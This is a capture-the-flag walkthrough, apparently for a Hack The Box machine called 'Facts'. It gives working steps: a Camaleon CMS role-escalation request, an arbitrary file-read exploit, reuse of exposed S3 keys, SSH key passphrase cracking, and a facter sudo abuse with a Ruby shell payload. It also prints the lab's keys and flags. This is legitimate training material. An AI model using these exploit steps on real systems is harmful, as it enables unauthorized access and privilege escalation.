# Facts

As always, we start by knocking on the front door with a good ol’ Nmap scan:

```shellscript
$ nmap -sC -sV -T5 10.129.1.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 11:29 CST
Nmap scan report for facts.htb (10.129.1.87)
Host is up (0.0085s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: facts
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
```

Nothing too wild yet. Just SSH and a web server. Classic “there’s definitely more here” vibes. Since port 80 is open, let’s see what’s cooking in the browser:

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

A quick look around but nothing interesting, time to unleash Gobuster:

```shellscript
$ gobuster dir -u http://facts.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.bashrc              (Status: 200) [Size: 11119]
/.cvs                 (Status: 200) [Size: 11110]
/.forward             (Status: 200) [Size: 11122]
/.bash_history        (Status: 200) [Size: 11137]
/.cache               (Status: 200) [Size: 11116]
/.config              (Status: 200) [Size: 11119]
/.cvsignore           (Status: 200) [Size: 11128]
/.git                 (Status: 200) [Size: 11110]
/.git-rewrite         (Status: 200) [Size: 11134]
/.git_release         (Status: 200) [Size: 11134]
/.gitattributes       (Status: 200) [Size: 11140]
/.gitconfig           (Status: 200) [Size: 11128]
/.gitignore           (Status: 200) [Size: 11128]
/.gitk                (Status: 200) [Size: 11113]
/.gitkeep             (Status: 200) [Size: 11122]
/.gitmodules          (Status: 200) [Size: 11131]
/.gitreview           (Status: 200) [Size: 11128]
/.history             (Status: 200) [Size: 11122]
/.hta                 (Status: 200) [Size: 11110]
/.htaccess            (Status: 200) [Size: 11125]
/.htpasswd            (Status: 200) [Size: 11125]
/.listing             (Status: 200) [Size: 11122]
/.listings            (Status: 200) [Size: 11125]
/.mysql_history       (Status: 200) [Size: 11140]
/.passwd              (Status: 200) [Size: 11119]
/.perf                (Status: 200) [Size: 11113]
/.profile             (Status: 200) [Size: 11122]
/.rhosts              (Status: 200) [Size: 11119]
/.sh_history          (Status: 200) [Size: 11131]
/.ssh                 (Status: 200) [Size: 11110]
/.subversion          (Status: 200) [Size: 11131]
/.svn                 (Status: 200) [Size: 11110]
/.svnignore           (Status: 200) [Size: 11128]
/.swf                 (Status: 200) [Size: 11110]
/.web                 (Status: 200) [Size: 11110]
/400                  (Status: 200) [Size: 6685]
/404                  (Status: 200) [Size: 4836]
/500                  (Status: 200) [Size: 7918]
/CVS                  (Status: 200) [Size: 11110]
/_framework/blazor.webassembly.js (Status: 422) [Size: 8380]
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.cgi            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/admin.pl             (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/ajax                 (Status: 200) [Size: 0]
/cache                (Status: 200) [Size: 11116]
/captcha              (Status: 200) [Size: 5459]
/config               (Status: 200) [Size: 11119]
/cvs                  (Status: 200) [Size: 11110]
/en                   (Status: 200) [Size: 11109]
/error                (Status: 500) [Size: 7918]
/forward              (Status: 200) [Size: 11122]
/git                  (Status: 200) [Size: 11110]
/history              (Status: 200) [Size: 11122]
/hta                  (Status: 200) [Size: 11110]
/htpasswd             (Status: 200) [Size: 11125]
/index.htm            (Status: 200) [Size: 11125]
/index                (Status: 200) [Size: 11113]
/index.html           (Status: 200) [Size: 11128]
/index.php            (Status: 200) [Size: 11125]
/listing              (Status: 200) [Size: 11122]
/listings             (Status: 200) [Size: 11125]
/page                 (Status: 200) [Size: 19593]
/passwd               (Status: 200) [Size: 11119]
/perf                 (Status: 200) [Size: 11113]
/post                 (Status: 200) [Size: 11308]
/profile              (Status: 200) [Size: 11122]
/robots.txt           (Status: 200) [Size: 99]
/robots               (Status: 200) [Size: 33]
/rss                  (Status: 200) [Size: 183]
/search               (Status: 200) [Size: 19187]
/sitemap              (Status: 200) [Size: 3508]
/sitemap.gz           (Status: 500) [Size: 7918]
/sitemap.xml          (Status: 200) [Size: 3508]
/ssh                  (Status: 200) [Size: 11110]
/svn                  (Status: 200) [Size: 11110]
/swf                  (Status: 200) [Size: 11110]
/up                   (Status: 200) [Size: 73]
/web                  (Status: 200) [Size: 11110]
/welcome              (Status: 200) [Size: 11966]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================
```

And… wow. It vomits out a ton of directories. Most of them look like default junk, but one stands out: `/admin` :

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Tried some default credentials. No dice. So instead of guessing, I just made my own account. Because why not?

After logging in, I noticed something interesting:

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Can you see it? It's a CMS, `Camaleon CMS running Version 2.9.0` to be exact.

A quick search led me to two GitHub PoCs:

* [CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304)
* [CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987)

The first one describes an issue where updating your password allows you to sneak in extra parameters — like, say… your role.

That’s right. Role escalation via parameter tampering. Chef’s kiss.

So instead of just updating my password, I slipped this in: `password[role]=admin`

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

```
_method=patch&authenticity_token=gJ87Zj_AwBy5zQNsgYfXiwfTNCOIYbcGplj7JEGL1moV3kOyv9oc5iwBkgopQai6CGdSzzTz2PnVucGbByyvbA&password%5Bpassword%5D=test&password%5Bpassword_confirmation%5D=test&password%5Brole%5D=admin
```

And just like that… We are now admin. That should not have worked. But I’m glad it did.

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

The second exploit (CVE-2024-46987) requires admin privileges. Perfect timing. Running the exploit, we can read arbitrary files. First test:

```shellscript
$ python3 exploit.py -u http://facts.htb -l jagerr -p secret /etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

Success. If we can read `/etc/passwd`, we can read basically anything the web user can.

Naturally, we go hunting for flags:

```shellscript
$ python3 exploit.py -u http://facts.htb -l jagerr -p secret /home/william/user.txt
ca742cb0cf289238b4f902e7fc25ae90
```

> **User flag:** ca742cb0cf289238b4f902e7fc25ae90

User flag secured. But we’re not done yet.

While poking around the site, I noticed some AWS S3 credentials just casually hanging out. Never ignore exposed cloud creds.&#x20;

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Let's configure AWS CLI and list the goods:

```shellscript
$ aws configure
AWS Access Key ID [None]: AKIA769DF66BCE61841C
AWS Secret Access Key [None]: GRkJLSLg31yRleJwXfaeG+KKqy1SxvOyKbntPBKI
Default region name [None]: us-east-1
Default output format [None]: json

$ aws --endpoint-url http://facts.htb:54321 s3 ls
2025-09-11 07:06:52 internal
2025-09-11 07:06:52 randomfacts
```

Two buckets: `internal` and `randomfacts`.  The `internal` bucket looked… interesting.

Inside it?

```shellscript
$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 12:45:13        220 .bash_logout
2026-01-08 12:45:13       3900 .bashrc
2026-01-08 12:47:17         20 .lesshst
2026-01-08 12:47:17        807 .profile
```

Oh no. Don’t tell me.

Inside `.ssh/`:

```shellscript
$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
2026-02-11 13:11:46        100 authorized_keys
2026-02-11 11:26:17        464 id_ed25519
```

Yes. Yes, you did.

Using our file read exploit again, we grabbed the key (maybe the key in the bucket was an old one, so it's safer to grab the live one):

```shellscript
$ python3 exploit.py -u http://facts.htb -l jagerr -p secret -v /home/trivia/.ssh/id_ed25519
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBEsvUR7k
ewTOO9AkQXSL9xAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIDYemfqNRIwdYlrM
pXC2DNm9AXPs0fhtF8DGa0wwx3u2AAAAoL/IT2LnZszZxwtmOdN7jRuLfOKsPooTptLIk6
5X0yHRvdLTWX+py3ClrM4AcPrSqh6sHP1x+Aaran0OziJ0Z6tY9e5a/cNefYT/+SDLj8Gh
ctV6qD1PVqQJmf576ugQY3cMQzIj/5kfPXIRwjhtRRka4I5lob5Dr2SQyxOnWhx3T7tbNb
gBZZvCU5SAb5WjWDxWAQcvXfDz6Y22vNm0Ks0=
-----END OPENSSH PRIVATE KEY-----
```

Got the private key.&#x20;

Tried SSH.&#x20;

Nope.&#x20;

Passphrase protected.

Alright. Time to introduce it to John:

```shellscript
$ ssh2john jagerr_key >> jagerr_key.hash
$ john jagerr_key.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (jagerr_key)     
1g 0:00:02:26 DONE (2026-02-11 13:32) 0.006848g/s 21.91p/s 21.91c/s 21.91C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And a couple minutes later we got the password `dragonballz`. Honestly? Respect.

Let's login:

```shellscript
$ ssh trivia@10.129.1.87 -i jagerr_key 
Enter passphrase for key 'jagerr_key': 
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Feb 11 07:32:55 PM UTC 2026

  System load:           0.0
  Usage of /:            72.0% of 7.28GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             221
  Users logged in:       1
  IPv4 address for eth0: 10.129.1.87
  IPv6 address for eth0: dead:beef::250:56ff:fe94:de1c


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

Nice, we're in. Let's check if we have any sudo permissions:&#x20;

```shellscript
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Facter? Never heard of it. Checking out the contents of that file, it turns out its a Ruby script:

```shellscript
trivia@facts:~$ cat /usr/bin/facter
#!/usr/bin/ruby
# frozen_string_literal: true

require 'pathname'
require 'facter/framework/cli/cli_launcher'

Facter::OptionsValidator.validate(ARGV)
processed_arguments = CliLauncher.prepare_arguments(ARGV)

CliLauncher.start(processed_arguments)
```

A quick lookup on [GTFOBins](https://gtfobins.org/gtfobins/facter/) shows that `facter` can be abused with a custom directory.

So we craft a tiny Ruby payload:

```shellscript
#!/usr/bin/env ruby
exec "/bin/sh"
```

Save it as `custom.rb` in `/tmp`. Then run:

```shellscript
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir=/tmp
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
e81650c154206ed66a5b16f6cc57b473
```

We are root.

Just like that.

> **Root flag:** e81650c154206ed66a5b16f6cc57b473
